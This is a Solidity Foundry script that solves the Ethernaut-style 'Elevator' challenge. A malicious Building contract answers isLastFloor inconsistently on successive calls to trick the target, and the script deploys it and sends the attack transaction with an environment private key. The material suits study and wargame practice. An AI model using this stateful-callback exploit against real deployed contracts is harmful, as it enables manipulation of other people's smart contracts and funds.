// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract MyBuilding {

    bool private mySwitch;
    Elevator public elevatorInstance = Elevator(0x50C677101906d05bD64e0e8b923B93dBDAfC64D3);

    function startAttack() external {
        elevatorInstance.goTo(0);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if(!mySwitch){
            mySwitch = true;
            return false;
        } else {
            return true;
        }
    }
}

contract ElevatorSolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MyBuilding myBuilding = new MyBuilding();
        myBuilding.startAttack();
        vm.stopBroadcast();
    }
}